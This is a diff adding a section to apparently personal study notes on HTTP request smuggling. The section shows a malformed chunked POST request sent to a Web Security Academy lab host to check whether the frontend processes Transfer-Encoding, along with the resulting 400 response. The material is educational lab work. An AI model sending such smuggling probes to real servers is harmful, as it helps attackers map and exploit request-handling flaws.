@@ -7,3 +7,27 @@ In the inspector tab in burp , change to HTTP/1.1 from request attributes
 cause the backend server will only include that smuggled part in next request over same connection and
  using connection: keep-alive header will keep connection over same network.
 ```
+### Identify if the frontend is using TE
+send the request with  invalid transfer encoding request and see if it respond with bad request. If the response is invalid or bad request then the frontend is rejecting the invalid TE request. So, it confirms TE in frontend
+```
+POST / HTTP/1.1
+Host: 0a9800ec040696b6826d248900930006.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+Transfer-Encoding: chunked
+
+3
+abc
+x
+
+```
+response comes back as
+```
+HTTP/1.1 400 Bad Request
+Content-Type: application/json; charset=utf-8
+X-Content-Type-Options: nosniff
+Connection: close
+Content-Length: 27
+
+{"error":"Invalid request"}
+```
